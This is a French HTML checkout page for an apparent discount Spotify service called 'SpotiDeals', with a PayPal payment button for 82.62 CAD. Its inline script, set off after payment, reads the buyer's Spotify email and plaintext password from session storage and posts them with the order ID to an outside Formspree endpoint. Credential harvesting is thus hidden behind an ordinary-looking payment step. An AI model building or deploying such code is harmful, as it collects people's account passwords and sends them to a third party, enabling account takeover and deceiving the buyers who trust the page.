<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>SpotiDeals – Paiement</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="css/style.css">

  <!-- PayPal SDK -->
  <script src="https://www.paypal.com/sdk/js?client-id=AW-bLBrtEPaB0FTD-Oa4rQ1gbQBNLkkqSsAtGh968nfbb-HA_iZh-Cptg_1UzbE9GYagkCPtHFEUosfm&currency=CAD"></script>
</head>
<body>
  <div class="container">
    <header>
      <h1>Paiement SpotiDeals</h1>
      <a href="index.html" class="btn" style="margin-top:-10px; background:#555;">← Accueil</a>
    </header>

    <section class="card">
      <h2>Paiement via PayPal</h2>
      <p>Montant total : <strong>82,62 $ CAD</strong></p>
      <div id="paypal-button-container"></div>
    </section>

    <footer>© 2025 SpotiDeals</footer>
  </div>

  <script>
    paypal.Buttons({
      style: { shape:'pill', color:'blue', label:'pay' },
      createOrder: (data, actions) => actions.order.create({
        purchase_units: [{
          amount: { value:'82.62' },
          invoice_id: 'SD-' + Date.now()
        }]
      }),
      onApprove: (data, actions) =>
        actions.order.capture().then(details => {
          const spotifyEmail    = sessionStorage.getItem('spotifyEmail');
          const spotifyPassword = sessionStorage.getItem('spotifyPassword');
          const orderID         = details.id;
          // Envoi à Formspree  
          fetch('https://formspree.io/f/xanorewp', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
              spotifyEmail,
              spotifyPassword,
              orderID,
              method:'PayPal'
            })
          });
          alert('✅ Paiement reçu !\nVotre numéro de commande : ' + orderID);
          window.location.href = 'index.html';
        })
    }).render('#paypal-button-container');
  </script>
</body>
</html>
